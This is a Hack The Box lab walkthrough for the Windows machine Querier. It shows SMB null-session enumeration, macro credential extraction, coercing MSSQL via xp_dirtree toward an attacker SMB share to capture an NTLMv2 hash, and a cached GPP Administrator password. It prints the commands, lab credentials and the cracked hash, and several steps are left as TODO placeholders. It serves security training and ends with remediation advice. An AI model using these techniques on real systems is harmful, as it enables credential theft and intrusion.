---
title: 'HTB Querier Walkthrough'
description: 'Step-by-step Hack The Box Querier walkthrough. Exploit hardcoded Excel macro credentials, capture MSSQL NTLMv2 hashes, and escalate via Cached GPP files.'
date: 2026-06-23
difficulty: Medium
os: Windows
authors:
  - name: Bilash J. Shahi
    title: Cybersecurity Professional
    picture: https://avatars.githubusercontent.com/elodvk
    url: https://purplesec.org
tags:
  - Hack The Box
  - HTB
  - Medium
  - Windows
  - Walkthrough
  - MSSQL
  - NTLMv2
  - Macros
  - GPP
image: assets/querier/querier_banner.png
---

# 🛡️ HTB Querier Walkthrough

## Machine Overview

**Attack Chain Summary:** The engagement begins with anonymous SMB enumeration, revealing a `Reports` share containing an Excel file with macros. Analyzing the macro using `olevba` uncovers hardcoded credentials for an MSSQL database. After connecting to the database as the `reporting` user, `xp_dirtree` is utilized to coerce authentication back to the attacker, capturing the `mssql-svc` service account's NTLMv2 hash. Cracking this hash grants system access. Finally, running PowerUp reveals a cached Group Policy Preference (GPP) file containing the `Administrator` password, leading to complete domain compromise.

| Attribute | Details |
| :--- | :--- |
| **Machine Name** | Querier |
| **Operating System** | Windows |
| **Difficulty** | Medium |
| **IP Address** | 10.129.174.20 |

---

## Reconnaissance & Enumeration

The engagement starts with identifying exposed services on the target to understand the technology stack and pinpoint potential entry vectors.

### Port Scanning

<!-- TODO: Missing data. Please provide the raw Nmap output and summary table here. -->

### Service Identification & Web Footprinting

Initial enumeration focuses on the Server Message Block (SMB) service. Testing for anonymous or null session access reveals that the server permits unauthenticated share listing.

```shell title="SMB Null Session Enumeration"
smbclient -N -L '//10.129.174.20/'
```

```text title="smbclient Output"
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Reports         Disk      
```

The `Reports` share immediately stands out as a non-standard, potentially valuable directory. Accessing the share anonymously reveals a single file of interest: an Excel macro-enabled workbook.

```shell title="Accessing Reports Share"
smbclient -N  '//10.129.174.20/Reports'
```

```text title="Downloading Excel File"
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (8.4 KiloBytes/sec) (average 8.4 KiloBytes/sec)
```

---

## Initial Foothold

### The Vulnerability

The downloaded file, `Currency Volume Report.xlsm`, is a macro-enabled spreadsheet. In corporate environments, these spreadsheets frequently contain embedded Visual Basic for Applications (VBA) scripts used to pull real-time data from internal databases. It is a common, severe misconfiguration for developers to hardcode administrative or service account credentials directly within these scripts.

### Exploitation

To analyze the macro safely without executing it in Excel, the `oletools` suite is utilized. Specifically, `olevba` is used to extract and inspect the embedded VBA code.

```shell title="Analyzing the XLSM file"
pip install oletools
olevba Currency\ Volume\ Report.xlsm
```

The tool successfully extracts the macro, exposing a direct ADODB connection string containing hardcoded MSSQL credentials.

```text title="olevba Output"
olevba 0.60.2 on Python 3.13.12 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open
...snip...
```

The script leaks the following credentials:

* **Username:** `reporting`
* **Password:** `PcwTWTHRwryjc$c6`

### Lateral Movement: MSSQL Hash Capture

With valid database credentials, `impacket-mssqlclient` is used to authenticate to the MSSQL service.

```shell title="Connecting to MSSQL"
impacket-mssqlclient 'reporting:PcwTWTHRwryjc$c6'@10.129.174.20 -windows-auth
```

While the `reporting` user may have limited rights on the database, MSSQL contains a stored procedure called `xp_dirtree`, which is designed to list directories. If this procedure is pointed at an attacker-controlled SMB share (e.g., `\\10.10.14.71\fake`), the MSSQL service account will attempt to authenticate to the attacker's machine, transmitting its NetNTLMv2 hash in the process.

By setting up a rogue SMB server (like Responder) and triggering `xp_dirtree`, the hash for the `mssql-svc` account is successfully captured and cracked offline using Hashcat or John the Ripper.

```text title="Captured & Cracked NTLMv2 Hash"
MSSQL-SVC::QUERIER:2d03c6c125c15dda:afeabbfe7440d1b25f935f69bc8cf3cf:010100000000000080766c8a3102dd01e3b24b9eb3dd20510000000002000800570051004b004a0001001e00570049004e002d005200460056004200460036003100510056005000470004003400570049004e002d00520046005600420046003600310051005600500047002e00570051004b004a002e004c004f00430041004c0003001400570051004b004a002e004c004f00430041004c0005001400570051004b004a002e004c004f00430041004c000700080080766c8a3102dd0106000400020000000800300030000000000000000000000000300000bb6d74e7e36e8f9280b4c0b0293f08ea390fc6466a4edeb81707d184f1e6322f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0037003100000000000000000000000000:corporate568
```

The cracked password for the `mssql-svc` account is `corporate568`.

### User Flag

Using the newly acquired credentials for `mssql-svc`, remote access is achieved (e.g., via WinRM or psexec), allowing for the retrieval of the user flag.

<!-- TODO: Missing data. Please provide the exact commands used to log in as mssql-svc and read the user flag. -->

---

## Privilege Escalation

### Enumeration for PrivEsc

With a stable session as `mssql-svc`, local enumeration scripts such as `PowerUp.ps1` or `WinPEAS` are executed to identify local privilege escalation vectors. 

```text title="PowerUp/Enumeration Output"
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 13704
ProcessId   : 380
Name        : 380
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

...snip...

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

The enumeration reveals several potential escalation paths, including `SeImpersonatePrivilege` and modifiable services. However, the most direct and severe finding is the discovery of Cached GPP Files containing a decrypted password.

### The Misconfiguration

Group Policy Preferences (GPP) historically allowed administrators to create local accounts or change local administrator passwords across a domain. The password was stored in the `Groups.xml` file on the SYSVOL share, encrypted with a statically known AES key published by Microsoft. Any authenticated user could read this file, decrypt the password, and gain administrative access.

While Microsoft patched this in 2014 (MS14-025) by preventing new passwords from being added, existing `Groups.xml` files often remain cached locally on systems indefinitely. In this case, the `Groups.xml` file was left behind, leaking the `Administrator` password.

### Exploitation

The enumeration script automatically decrypted the `cpassword` field from the XML file, revealing the plaintext Administrator password: `MyUnclesAreMarioAndLuigi!!1!`.

Using these credentials, a remote session can be established as the domain/local Administrator (e.g., using `impacket-psexec` or Evil-WinRM).

<!-- TODO: Missing data. Please provide the exact commands used to authenticate as Administrator. -->

### Root Flag

With full administrative control, the root flag is retrieved.

<!-- TODO: Missing data. Please provide the exact command to read root.txt. -->

---

## Conclusion & Takeaways

### Vulnerability Remediation

1. **Remove Hardcoded Credentials:** The initial breach was caused by hardcoded database credentials within a publicly accessible Excel macro. Applications should utilize secure credential stores, Windows Authentication (Integrated Security), or secure prompt mechanisms rather than embedding plaintext passwords in scripts.
2. **Disable Unnecessary Stored Procedures:** The lateral movement relied on capturing an NTLMv2 hash via `xp_dirtree`. If stored procedures like `xp_dirtree` or `xp_cmdshell` are not explicitly required by the application, they should be disabled to prevent outbound coercion attacks.
3. **Clean Up Legacy GPP Files:** Storing passwords in Group Policy Preferences is a deprecated and highly insecure practice. Administrators must actively search for and delete all legacy `Groups.xml`, `Services.xml`, and `Printers.xml` files containing `cpassword` attributes across the SYSVOL share and local system caches.

### Key Lessons

*   **SMB Shares are Information Goldmines:** Even seemingly harmless "Reports" shares can contain critical infrastructure details or credentials. Anonymous SMB access should be disabled universally, and the Principle of Least Privilege (PoLP) should be applied to all file shares.
*   **Service Accounts Can Be Coerced:** Database and service accounts often run with elevated privileges or can access other systems in the domain. Coercing these accounts to authenticate externally is a highly effective way to capture hashes or relay authentication, highlighting the need for SMB signing and strict outbound firewall egress rules.